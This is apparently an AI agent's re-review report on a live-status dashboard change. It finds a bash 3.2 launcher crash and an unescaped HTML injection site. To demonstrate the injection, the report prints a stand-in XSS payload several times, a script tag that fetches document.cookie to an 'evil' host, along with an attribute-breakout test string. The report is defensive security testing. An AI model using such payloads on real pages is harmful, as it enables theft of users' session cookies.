# Code Review (RE-REVIEW 2, after remediation 0f7dacd) — CHANGE-0127 / spec-live-status-dashboard

```yaml
review:
  scope: git diff origin/main...HEAD (feat/live-status-dashboard @ 0f7dacd, 14 commits, 26 files); remediation delta git diff b53c1a2..HEAD (7 files, +418/-41)
  spec: docs/specs/SPEC-DRAFT-spec-live-status-dashboard.md (12 Spec-AC, 35-row Test Plan)
  spec_compliance:
    verdict: fail
    ac_walk:
      - { ac: Spec-AC-01, call: compliant,
          citation: "TEST-001/002/003/028 green in my own wrapper run (rc 0); my scratch-repo runs wrote both outputs and exited 0 in every probe below" }
      - { ac: Spec-AC-02, call: compliant,
          citation: "BLOCKING-A dead by my own fixture: a 3-file degraded corpus (chmod-000 .jsonl + non-JSON gemini logs.json + malformed LINE) run 3x with the cache ENABLED emits the SAME 3 notes every run (run1 read=4/skipped=0, run2+3 read=0/skipped=4). generate-live-status.mjs:185-187 cache-hit replay + :193-195 note persistence; TEST-033 extended" }
      - { ac: Spec-AC-03, call: compliant,
          citation: "generate-live-status.mjs:120-143 now delegates to lib/runtime-file.mjs loadOrDegrade+atomicWrite. My own four corruption shapes all degrade LOUDLY with correct totals and exit 0: truncated-to-50% (parse error), JSON array (wrong shape via isShape), chmod-000 (EACCES), directory-at-path (EISDIR). 8 concurrent writers left a whole, parseable cache and zero leftover .tmp files. TEST-007/008/035 green" }
      - { ac: Spec-AC-04, call: compliant, citation: "TEST-009/010 green" }
      - { ac: Spec-AC-05, call: compliant, citation: "TEST-020/023/032 green; the --home strip at :365-371 is unchanged from the round that verified it" }
      - { ac: Spec-AC-06, call: compliant, citation: "TEST-011/012/013/014 green" }
      - { ac: Spec-AC-07, call: compliant, citation: "TEST-015 green" }
      - { ac: Spec-AC-08, call: compliant, citation: "TEST-016/017 green" }
      - { ac: Spec-AC-09, call: non-compliant,
          citation: ".aai/scripts/aai-live.sh:87 — the new WARMUP_ARGS array expansion is fatal under `set -u` on bash 3.2 (the only bash on stock macOS and on this machine), so the documented bare `bash .aai/scripts/aai-live.sh --watch` exits 1 before generating, opening or watching. Reproduced; NEW regression introduced by 0f7dacd. See BLOCKING-I" }
      - { ac: Spec-AC-10, call: non-compliant,
          citation: "generate-live-status.mjs:507 — the AC's clause 'every foreign-data interpolation ... SHALL be HTML-escaped so a hostile harness payload never renders a live script' is false: the spend-rows branch renders foreign-derived tokens through na(), not naEsc(). Reproduced end-to-end — a live <script>fetch('http://evil/'+document.cookie)</script> in the page. See BLOCKING-II" }
      - { ac: Spec-AC-11, call: compliant,
          citation: "`git status --porcelain` = 0 lines after the full suite run and after every probe (all my fixtures live outside the repo)" }
      - { ac: Spec-AC-12, call: compliant,
          citation: "check-test-registration.mjs tests/skills rc 0; test-aai-hygiene-pack.sh and test-ps1-quality.sh green; no new .aai file in this delta" }
  code_quality:
    verdict: fail
    findings:
      - { rank: BLOCKING, file: .aai/scripts/aai-live.sh, line: 87,
          issue: "`node \"$GEN\" \"${WARMUP_ARGS[@]}\"` expands an EMPTY array under the file's own `set -uo pipefail` (line 13). bash < 4.4 — including bash 3.2.57, the only bash on stock macOS and the one `/usr/bin/env bash` resolves to on this machine — treats that as an unbound variable and the non-interactive shell exits immediately. WARMUP_ARGS is empty for exactly one invocation: `--watch` with no other flag, i.e. the form the product doc documents at docs/product/live-status-dashboard.md:35 (`bash .aai/scripts/aai-live.sh [--watch]`) and the script's own usage line at :8. Introduced by 0f7dacd; b53c1a2's bare `node \"$GEN\"` had no array. The repo already ships the bash-3.2-safe idiom (`\"${ARR[@]:-}\"`, .aai/scripts/aai-bootstrap.sh:886).",
          failure_scenario: "Reproduced verbatim in a scratch repo: `/bin/bash .aai/scripts/aai-live.sh --watch` -> `.aai/scripts/aai-live.sh: line 87: WARMUP_ARGS[@]: unbound variable`, rc=1, no live-status.html, no live-status-data.json, no opener call, no watch loop. The same command on b53c1a2 runs fine. This is BLOCKING-2's failure mode restored and made worse (BLOCKING-2 at least opened a browser tab). TEST-031 misses it because it invokes `--watch --interval 1` — two surviving args, so the array is never empty. Fix: `\"${WARMUP_ARGS[@]:-}\"` or a `(( ${#WARMUP_ARGS[@]} ))` guard; RED probe = TEST-031 with the extra flags removed, run under /bin/bash." }
      - { rank: BLOCKING, file: .aai/scripts/generate-live-status.mjs, line: 507,
          issue: "`const spendRows = (rows) => ... <td>${na(r.tokens)}</td>` is the ONLY remaining na() call on foreign-derived data in renderHtml, and na() does not escape — the exact defect BLOCKING-1 was raised for, in an adjacent branch. The naEsc comment three lines of code above it (:82-88) states the rule the line breaks: 'Every foreign-data interpolation in renderHtml() must go through esc() or naEsc()'. r.tokens is foreign-derived because live-parsers/claude-code.mjs:47-51 and live-parsers/codex.mjs:58-61 sum `(u.input_tokens || 0) + ...` with no Number() coercion, so a STRING token field propagates through `usageToday += r.usage` (:409-410) into the rendered cell verbatim.",
          failure_scenario: "Reproduced end-to-end, default flags, no --home trickery beyond the fixture: a ~/.claude/projects/**/ *.jsonl assistant line whose `message.usage.input_tokens` is \"<script>fetch('http://evil/'+document.cookie)</script>\" renders into docs/ai/live-status.html as `<td>0<script>fetch('http://evil/'+document.cookie)</script>000</td>` — TWO live script tags (Spend today + Spend 7d). The page is opened from file:// by aai-live.sh, so the script executes with local-file privileges and makes an outbound request from the page Spec-AC-10 guarantees is network-free. TEST-018's grep is `<script ` (trailing space) and TEST-030 uses a benign numeric usage payload, so nothing in the suite covers this branch. This closes the prior round's cannot_verify #4 ('that naEsc() is now the ONLY unescaped-foreign-data hole ... I did not mutation-test every field of every record shape') with a positive finding. Non-adversarial variant, no attacker needed: an upstream format drift to string token counts silently renders concatenated garbage instead of a number. Fix: naEsc(r.tokens) AND Number-coerce in both parsers' usageTotal (a non-numeric field should yield null, not a string)." }
      - { rank: NON-BLOCKING, file: .aai/scripts/generate-live-status.mjs, line: 193,
          issue: "The BLOCKING-A fix PERSISTS the notes array into the cache entry and replays it on every hit. notes is uncapped (recorded NB-3), so an uncapped array is now also written to disk and re-emitted forever. The replay itself is correctly idempotent — no duplication, verified — but the ceiling moved from 'one bad run' to 'permanent'.",
          failure_scenario: "Measured: one 20 000-line non-JSON file in the corpus -> notes=20000 on run 1 AND on runs 2 and 3 (no growth, but no decay), cache 3 609 102 bytes, live-status-data.json 3 710 879 bytes, HTML 4 184 bytes. Under --watch that 3.6 MB cache is re-read, re-serialized and atomically rewritten every tick, and none of it is ever visible to the operator (the HTML still never renders notes). Recommended disposition: remediate-in-tree, folded into NB-3's cap — the cap must be applied BEFORE the notes are stored in the cache entry, not only at render." }
      - { rank: NON-BLOCKING, file: .aai/scripts/generate-live-status.mjs, line: 453,
          issue: "atomicWrite kills class E (torn write) but the load->mutate->write sequence still has no lease, so class A (cross-process lost update) survives the migration. runtime-file.mjs's claimExclusive is a cold-start single-winner claim, not a read-modify-write mutex, so it is not the right primitive here — but the gap should be named rather than assumed closed by the port.",
          failure_scenario: "Reproduced: two generators over different fixture homes sharing one --cache path, run concurrently -> the surviving cache holds 40 keys, ALL from the second process; the first process's 40 entries are discarded. Both processes' own outputs were correct (usage 600 each) and the loss costs exactly one cold re-parse, so the harm is bounded and self-healing. --watch makes concurrent generators ordinary. Recommended disposition: promote-to-follow-up-ref (a rebuild-from-discovered-set merge, folded into NB-1's prune work, makes the lost update harmless by construction)." }
      - { rank: NON-BLOCKING, file: .aai/scripts/lib/runtime-file.mjs, line: 99,
          issue: "atomicWrite's documented permission preservation means a cache file that has become mode 000 stays mode 000 across every rewrite, so loadCache degrades on it forever. Correct for the primitive's stated intent (a 0600 secret), a wedge for a purely derived cache.",
          failure_scenario: "Reproduced: `chmod 000 cache.json` -> every subsequent run emits `cache ... unreadable or corrupt (EACCES), rebuilding from a cold scan`, rewrites 344 bytes back at mode 000, and pays a full cold scan again. Loud (so not a silent failure) but permanent with no self-heal and no documented escape hatch. Recommended disposition: remediate-in-tree (on a `corrupt` load of a DERIVED cache, unlink before rewriting) or promote-to-follow-up-ref." }
  cannot_verify:
    - { claim: "The .ps1 twins behave correctly at runtime on Windows — specifically that `& node $Gen @WarmupArgs` with an empty $WarmupArgs and the new --output resolution loop work as the bash twin does. Static reading says yes (PowerShell splatting an empty array is a no-op and has no `set -u` analogue, so BLOCKING-I is bash-only), but nothing executes it.",
        closes_with: "A Windows CI job or a manual pwsh run. TEST-023 is parse + PSScriptAnalyzer only; TEST-031 exercises the bash twin exclusively. Spec RR-2 accepts this." }
    - { claim: "That generate-live-status.mjs:507 is now the LAST unescaped-foreign-data site. I re-grepped every `na(`/`esc(`/`${` in renderHtml and this is the only na() left, but I did not mutation-test every field of every record shape of every parser.",
        closes_with: "A corpus-sweep or mutation harness injecting a marker into every string field of every parser's record shape and asserting zero live tags. This is the prior round's cannot_verify #4, now partially closed by BLOCKING-II — the fact that it produced a real hit is the argument for building the harness." }
    - { claim: "Behavior of the notes/cache growth on a real long-lived corpus. The 3.6 MB figure is from a synthetic 20k-bad-line file; the real corpus emits notes: 0.",
        closes_with: "A cache size sample from a machine that has run --watch for weeks (also closes recorded NB-1's open question)." }
    - { claim: "The real Claude Code statusline stdin payload carries rate_limits.five_hour/seven_day in the shape the tap branch expects (spec RR-1)." ,
        closes_with: "One live statusLine install capturing a real payload." }
    - { claim: "The session-quotas branch renders REAL Codex rate limits correctly — every exercise of it is synthetic.",
        closes_with: "A run against a Codex session captured while the account is quota-limited." }
    - { claim: "The hooks overlay merges cleanly into a real .claude/settings.json and the Stop/Notification hooks fire.",
        closes_with: "An install-then-observe run; no test merges the overlay into a real settings file." }
    - { claim: "Upstream harness on-disk formats stay as observed (spec RR-3).",
        closes_with: "Nothing in this repo; the registry localizes the blast radius, which is the accepted mitigation." }
  process:
    verdict: pass-with-notes
  overall: fail
```

## Scope, preflight, and method

- `git branch --show-current` = `feat/live-status-dashboard` (never switched, never pushed).
  `git status --porcelain` empty before and after every probe — all fixtures live under the
  session scratchpad, outside the repo. `docs/ai/STATE.yaml:303` has
  `worktree.user_decision: worktree`, so the skill's worktree policy selects
  `git diff <base>...HEAD`; `inline_review_scope` is not consulted.
- Review scope: `origin/main...HEAD` @ 0f7dacd (26 files, +3654/-6), with the remediation
  delta `b53c1a2..HEAD` (7 files, +418/-41) read separately hunk by hunk.
- Read first: both prior review reports (094617Z, 102429Z), both validation reports
  (091200Z FAIL, 093456Z PASS), the frozen spec's AC table and Test Plan, and
  `.aai/scripts/lib/runtime-file.mjs` in full (the contract BLOCKING-B was raised against).
- **I did not use the committed tests as my evidence for the two prior BLOCKING findings.**
  I built my own fixtures in a scratch repo (a copy of the four script surfaces only) and
  reproduced each behavior from scratch; the committed suite was run afterwards as a
  regression net only.
- Recorded debt honored: I did not re-litigate NNB-3 (HARNESS_ENV_OVERRIDES) or NNB-5
  (`--no-cache` clobber), nor the twelve NB rows from round 1.

### Suites and gates, my own runs

| Command | Result |
|---|---|
| `bash .aai/scripts/aai-run-tests.sh tests/skills/test-aai-live-status.sh` | rc 0, **32** `PASS: TEST-*` |
| `bash .aai/scripts/aai-run-tests.sh bash tests/skills/test-aai-layer-profiles.sh` | rc 0 |
| `bash .aai/scripts/aai-run-tests.sh tests/skills/test-aai-hygiene-pack.sh` | rc 0 |
| `bash .aai/scripts/aai-run-tests.sh tests/skills/test-ps1-quality.sh` | rc 0 |
| `node .aai/scripts/check-test-registration.mjs tests/skills` | rc 0 |
| `node .aai/scripts/spec-lint.mjs --path docs/specs/SPEC-DRAFT-... --strategy hybrid` | LINT PASS, 0 findings |
| `node .aai/scripts/docs-audit.mjs --gate spec-live-status-dashboard` | GATE PASS |
| CHANGELOG per-entry heading | present (`## [unreleased] — feat(live-status): ...` at CHANGELOG.md:14; the bare `## [unreleased]` scaffold at :12 is pre-existing on origin/main) |
| `git status --porcelain` | clean |

The suites being green is precisely the problem with both BLOCKING findings below: neither
is reachable by any test in the suite.

## The two prior BLOCKING findings — both are dead

### BLOCKING-A (one-shot honesty notes) — DEAD

My own fixture, not TEST-033's: one fixture home carrying all three note families at once —
a `chmod 000` `.claude` session file, a `.gemini/tmp/p1/logs.json` containing non-JSON, and
a `.claude` jsonl with a malformed non-terminal line — run three times with the cache
ENABLED and no flag tricks:

| run | notes | files_read | files_skipped_unchanged | usage_today |
|-----|-------|-----------|--------------------------|-------------|
| 1 | 3 (`malformed line skipped …:2`, `file read failed … EACCES`, `gemini-cli: malformed file skipped …`) | 4 | 0 | 6 |
| 2 | 3 (identical) | 0 | 4 | 6 |
| 3 | 3 (identical) | 0 | 4 | 6 |

The named note appears on EVERY run, which is what the widened Spec-AC-02 clause ("on a cold
run OR a warm cache-hit run") now claims. The replay is also idempotent — the count stays 3,
it does not become 6 then 9 — because `cache[key].notes` is written once in the cold branch
(:193-195) and only read in the hit branch (:185-187); the entry is never rewritten on a hit.
I checked this explicitly for the cache-growth regression the dispatch asked about: cache
bytes were byte-identical across runs 1/2/3 in the 20k-note stress fixture too (3 609 102 B
each run). Ordering is also safe — `notesBefore = notes.length` is captured per file, so a
replayed note from an earlier file in the loop is never re-attributed to a later cold parse.

### BLOCKING-B (hand-rolled sidecar lifecycle) — DEAD

`loadCache` (:120-132) now calls `loadOrDegrade` with an `isShape` guard and pushes a named
note on `corrupt`; `saveCache` (:137-143) calls `atomicWrite`. Read against
`runtime-file.mjs`'s contract (:60-80, :99-114) the usage is correct: `empty: {}` is the
absent-case default, `isShape` rejects a parseable-but-wrong payload, the `corrupt` branch
returns `{}` only AFTER naming it, and the write is the temp+rename discipline. My own
repro-tests, all with correct totals and exit 0:

| cache state | note emitted | usage |
|---|---|---|
| truncated to 50% | `cache … unreadable or corrupt (parse error), rebuilding from a cold scan` | 15 (correct) |
| `[1,2,3]` (wrong shape) | same, via `isShape` | 15 |
| `chmod 000` (EACCES) | `… (EACCES) …` | 15 |
| a directory at the cache path (EISDIR) | `… (EISDIR) …` | 15 |

Concurrent writers: 8 generators over one shared `--cache` path, run simultaneously, left a
whole parseable cache (40 keys) and **zero leftover `.tmp.*` files** — class E is genuinely
dead. Class A (lost update) survives and is named as a NON-BLOCKING above with its honest
harm bound (one cold re-parse; both processes' outputs were correct).

The three NON-BLOCKING regressions from the last round are also closed, verified by
execution: `--watch --data-only` now writes only the JSON and never calls the opener;
`--watch --output "my out/page.html"` writes and OPENS `my out/page.html` (opener log:
`EXISTS [.../my out/page.html]`, `ARGC=1` — the space did not split, both twins quote
correctly: bash via the `"${ARR[@]}"` array and PowerShell via `@WarmupArgs` splatting);
`esc()`'s apostrophe addition escapes once and only once (a value containing the literal text
`it&#39;s &amp;already&lt;esc&gt; "quoted"` renders as `it&amp;#39;s &amp;amp;already&amp;lt;esc&amp;gt; &quot;quoted&quot;`,
which displays as the original text — no double-escaping, and `' onmouseover='alert(1)' x='`
renders fully inert as `&#39; onmouseover=&#39;…`).

## BLOCKING findings

### BLOCKING-I — `aai-live.sh --watch` is dead on stock macOS bash: the new warm-up array is an unbound variable

`.aai/scripts/aai-live.sh:87` (introduced by 0f7dacd; the twin `.aai/scripts/aai-live.ps1:51-52`
is NOT affected — PowerShell splats an empty array harmlessly and has no `set -u` analogue).

```bash
set -uo pipefail            # line 13
...
WARMUP_ARGS=()
for ARG in "$@"; do
  [[ "$ARG" == "--watch" ]] && continue
  WARMUP_ARGS+=("$ARG")
done
node "$GEN" "${WARMUP_ARGS[@]}" >/dev/null 2>&1 || true   # line 87
```

bash only stopped treating `"${empty[@]}"` as an unbound-variable error in 4.4. On stock
macOS — and on this machine, where `/bin/bash`, `command -v bash` and `/usr/bin/env bash` all
resolve to `GNU bash 3.2.57(1)-release` — expanding an empty array under `set -u` terminates
the script. `WARMUP_ARGS` is empty for exactly one invocation: `--watch` with no other flag.

Reproduced in a scratch repo containing only the four script surfaces:

```
$ /bin/bash .aai/scripts/aai-live.sh --watch
.aai/scripts/aai-live.sh: line 87: WARMUP_ARGS[@]: unbound variable
rc=1
```

No `live-status.html`, no `live-status-data.json`, no opener call, no watch loop. The same
invocation against `b53c1a2:.aai/scripts/aai-live.sh` runs normally.

Why BLOCKING:
- It is the documented headline command. `docs/product/live-status-dashboard.md:35` reads
  "Convenience launcher: `bash .aai/scripts/aai-live.sh [--watch]`" and the script's own usage
  line (`:8`) marks every other flag optional. The generated page even advertises it
  (`generate-live-status.mjs:543`).
- Spec-AC-09 requires the launcher twins to "generate then open the page"; under this
  invocation the bash twin does neither.
- It is a NEW regression from the remediation commit, in the same clause as BLOCKING-2, and
  strictly worse than BLOCKING-2 was (that at least opened a browser tab).
- The suite cannot see it: TEST-031 invokes `--watch --interval 1`, so `WARMUP_ARGS` has two
  elements and the empty-array path is never taken. This is the same shape as BLOCKING-A —
  a test that exercises one point of a space and pins a universal.

Fix: `"${WARMUP_ARGS[@]:-}"` (the idiom already used in-tree at
`.aai/scripts/aai-bootstrap.sh:886`) or a `(( ${#WARMUP_ARGS[@]} ))` guard around the call.
RED first: TEST-031 with `--interval 1` removed, executed under `/bin/bash` explicitly so the
assertion is not silently satisfied by a newer bash on a contributor's PATH.

### BLOCKING-II — the spend rows still interpolate foreign data through `na()`: a live `<script>` in the "zero-network" page

`.aai/scripts/generate-live-status.mjs:507`, with the enabling gap at
`.aai/scripts/live-parsers/claude-code.mjs:47-51` and `.aai/scripts/live-parsers/codex.mjs:58-61`.

```js
const spendRows = (rows) => rows.map((r) =>
  `<tr><td>${esc(r.harness)}</td><td>${esc(r.project)}</td><td>${na(r.tokens)}</td></tr>`).join('');
```

This is the only `na()` left in `renderHtml`, and it sits four lines below the comment that
forbids it:

```js
// naEsc: ... Every foreign-data interpolation in renderHtml() must go
// through esc() or naEsc() — na() alone is not an escaping function
```

`r.tokens` looks like a safe number, and would be if the parsers coerced. They do not:

```js
// claude-code.mjs:47-51
function usageTotal(u) {
  if (!u || typeof u !== 'object') return null;
  return (u.input_tokens || 0) + (u.output_tokens || 0)
    + (u.cache_creation_input_tokens || 0) + (u.cache_read_input_tokens || 0);
}
```

A string field turns `+` into concatenation, `usageToday += r.usage` (:409-410) propagates it,
and the value lands in the cell verbatim. Codex has the same fallback hole (`total_tokens` is
`typeof`-guarded, the manual sum below it is not); only that one guard is why Codex needs a
partial-shape payload to reach it.

Reproduced end-to-end with default flags:

```
$ cat ~/.claude/projects/proj/s1.jsonl        # fixture home
{"type":"assistant",...,"message":{"id":"m1","usage":{"input_tokens":"<script>fetch('http://evil/'+document.cookie)</script>","output_tokens":0,...}}}

$ node generate-live-status.mjs --home <fixture> --now ... --output <out>/p.html
- ../hX/out/p.html
$ grep -c -F '<script>fetch' <out>/p.html
2
$ grep -o '<tr><td>claude-code</td>.*' <out>/p.html | tail -1
<tr><td>claude-code</td><td>proj</td><td>0<script>fetch('http://evil/'+document.cookie)</script>000</td></tr>
```

Two live script tags (Spend today and Spend 7d), executing from `file://` because
`aai-live.sh` hands the page to the platform opener. The control in the same run holds:
`project` and `harness` are correctly escaped, so this is one branch, not a systemic
regression of the BLOCKING-1 fix.

Why BLOCKING:
- Spec-AC-10 was WIDENED by the BLOCKING-1 remediation to state a universal — "every
  foreign-data interpolation including the session-quotas branch SHALL be HTML-escaped so a
  hostile harness payload never renders a live script or breaks out of its attribute" — and
  the row is marked `done`. The universal is false at HEAD. This is the same charge that made
  BLOCKING-A blocking: certifying it means certifying an untrue AC.
- It is the identical defect class, identical exploit, identical AC and identical threat model
  as BLOCKING-1, which this ride already accepted as BLOCKING. Rating it lower now would be
  inconsistent, not economical.
- No test reaches it: TEST-030's usage payload is benign numbers, and TEST-018's guard is
  `grep -qi "<script "` — with a trailing space, so it does not even match `<script>`.
- There is a non-adversarial half that bites with no attacker at all: an upstream drift to
  string token counts silently renders `0<garbage>000` where a token total belongs, on a page
  whose entire value proposition is honest numbers.

Fix (two lines, both needed): `naEsc(r.tokens)` at :507, and `Number`-coerce in both parsers'
`usageTotal` so a non-numeric field yields `null` (an honest N/A) rather than a string.
RED first: a claude fixture with a `<script>` in `input_tokens`, asserting
`(html.match(/<script/gi)||[]).length === 0` and that `usage_today` is a number, plus the
codex partial-shape twin.

This finding closes the prior round's cannot_verify #4 with a positive hit, which is the
argument for building the mutation harness that entry named rather than re-grepping by hand
a fourth time.

## NON-BLOCKING findings and recommended dispositions (H6)

New this round. The ORCHESTRATOR records the disposition; as a read-only reviewer I file
neither a decision nor a ref.

| # | Finding (file:line) | Recommended disposition |
|---|---|---|
| N2B-1 | The BLOCKING-A fix persists the uncapped `notes` array into the cache and replays it forever — measured 3.6 MB cache / 3.7 MB data JSON from one 20 000-bad-line file, re-read and atomically rewritten every `--watch` tick, none of it visible in the 4 KB HTML — `generate-live-status.mjs:193-195` | remediate-in-tree, folded into recorded NB-3's cap (the cap must apply BEFORE the notes reach the cache entry) |
| N2B-2 | Class A (cross-process lost update) survives the runtime-file.mjs port — two concurrent generators sharing a `--cache` path leave only one process's 40 entries — `generate-live-status.mjs:377,453` | promote-to-follow-up-ref (a rebuild-from-discovered-set merge, folded into NB-1's prune, makes it harmless by construction; `claimExclusive` is a cold-start claim primitive, not the right tool here) |
| N2B-3 | A cache file that reaches mode 000 stays mode 000 forever (atomicWrite's documented permission preservation), so every run degrades loudly and pays a full cold scan with no self-heal — `lib/runtime-file.mjs:99-108` seen from `generate-live-status.mjs:137` | remediate-in-tree (unlink a DERIVED cache on a `corrupt` load before rewriting) or promote-to-follow-up-ref |

The prior rounds' NB-1…NB-12 and NNB-1…NNB-5 stand as recorded. NNB-1, NNB-2 and NNB-4 are
now CLOSED by 0f7dacd (verified by execution above); NNB-3 and NNB-5 remain open as recorded
debt per this dispatch's disposition and were not re-litigated. **I re-checked the H6
artifact status: `docs/ai/decisions.jsonl` still contains zero entries mentioning CHANGE-0127
or live-status, and no follow-up ref names any of them.** That debt must be discharged before
closeout independently of the two BLOCKING findings.

## INFO (never gates)

- Commit-message evidence claim, third occurrence of the same class ("29/29", "33/33", now
  "(33)"): the suite emits **32** `PASS: TEST-*`. 32 in this suite + TEST-021/022/023 in
  sibling suites = the 35 spec Test Plan rows. The same commit also claims esc()'s apostrophe
  "clos[es] the last unescaped attribute-breakout character" — BLOCKING-II shows an entire
  unescaped interpolation site remained.
- `resolve_output_path` (aai-live.sh:49-58) and the ps1 loop (:55-62) both take the LAST
  `--output` occurrence, matching `parseArgs`'s last-wins behavior — consistent, checked.
  A trailing `--output` with no value is ignored by all three, also consistent.
- Twin asymmetry, cosmetic: the ps1 filter `$_ -ne '--watch'` is case-INSENSITIVE by default,
  the bash `[[ "$ARG" == "--watch" ]]` is not. No failure scenario (the generator itself is
  case-sensitive, so `--WATCH` is already a no-op flag on both sides).
- `tests/skills/test-aai-layer-profiles.sh` still has no executable bit, so it must be run as
  `aai-run-tests.sh bash <path>`. Pre-existing, out of scope, unchanged since the last round.
- Adversarial probes that PASSED this round: JSON `__proto__` in a spool payload does not
  pollute `Object.prototype`; the apostrophe escape is single-pass and does not corrupt
  legitimate values or leak into the machine-readable JSON; the tap, hooks, session-quotas,
  project, sessionId and state render paths are all correctly escaped; a corrupt cache
  produces correct totals in all four damage shapes; concurrent writes never tear.

## Anti-gaming: coaching attempt recorded

The ANTI-GAMING CONTRACT binds the dispatching orchestrator not to "characterize expected
findings, pre-rate severity, or scope-exclude areas for the reviewer". This dispatch did all
three: it enumerated the regression classes to sweep (notes replay duplication, launcher arg
quoting, esc() double-escaping), it scope-excluded NNB-3 and NNB-5 as "recorded debt … do not
re-litigate", and it pre-framed the fresh-eyes pass with "weigh it against ride economy; only
genuinely gating findings get BLOCKING". Recorded as required.

Mitigating, and worth saying: the dispatch also correctly required me to verify the prior
BLOCKING findings *by my own fixtures* rather than by re-running the committed tests, which is
the instruction that produced the useful part of this pass. I reviewed the full scope anyway.
Both BLOCKING findings are outside the dispatch's list — BLOCKING-I came from executing the
launcher under the machine's actual bash rather than reading the quoting, and BLOCKING-II came
from mutation-probing a record field the dispatch never mentioned. On the "ride economy"
framing: I applied it. Three findings that would have been defensible NON-BLOCKING in a first
round are recorded as NON-BLOCKING here, and I re-rated nothing upward for symmetry. The two
BLOCKING calls are the two that make a shipped `done` AC row untrue.

I wrote only this report. No implementation file was touched; `git status --porcelain` is
clean.

## Process verdict — pass with notes

Strong: the remediation is again disciplined. BLOCKING-A got the honest fix (replay the note
while the condition persists) rather than the cheap one (narrow the AC), and the AC text was
widened to name the warm path explicitly. BLOCKING-B was a genuine port to the shared
primitives with the `isShape` guard used correctly, not a token import. The two NNB
regressions the previous round found were fixed together with the finding that caused them,
which is the right instinct. Spec Test Plan rows, RED logs and the prior review report were
all staged with the commit. Maker != checker held a third time.

Notes:
- The coaching attempt above.
- The pattern is now three-for-three: every BLOCKING finding in this ride has lived in a
  seam the suite does not sample — hostile input (round 1), warm cache (round 2), and now the
  *argument-count* seam of the launcher and the *field-type* seam of a parser record. Both of
  this round's findings are one variable away from a test that already exists. Before a fourth
  round, the cheapest structural fix is not more review: it is TEST-031 running the bare
  command under `/bin/bash`, and one mutation harness that walks every string field of every
  record shape. Both were named as cannot_verify entries in earlier rounds and both would have
  caught these findings at freeze.
- STATE is still stale from two rounds ago: `code_review.status` was never updated for either
  prior verdict, `base_ref` still names the branch under review rather than `origin/main`, and
  `worktree.branch` / `inline_review_scope` still describe the `core-prompt-diet` ride. All
  orchestrator-owned.
- Seventeen NON-BLOCKING rows across three rounds now have no decision entry and no follow-up
  ref (H6).

## Next steps

1. Close BLOCKING-I: `"${WARMUP_ARGS[@]:-}"` (or a length guard) in `aai-live.sh`, RED-proofed
   by TEST-031 invoked as bare `--watch` under an explicit `/bin/bash`.
2. Close BLOCKING-II: `naEsc(r.tokens)` at `generate-live-status.mjs:507` plus `Number`
   coercion in `claude-code.mjs`/`codex.mjs` `usageTotal`, RED-proofed by a string-token
   fixture asserting zero live `<script` and a numeric `usage_today`. Consider fixing
   TEST-018's `grep -qi "<script "` trailing space in the same pass.
3. Orchestrator records a disposition for N2B-1…N2B-3 and for the seventeen still-unrecorded
   prior rows (H6).
4. Orchestrator refreshes STATE (`code_review.status`, `report_paths`, `base_ref: origin/main`,
   the two stale `worktree` fields).
5. Re-review once the suites are green again; `overall` cannot flip to pass while either
   BLOCKING stands.
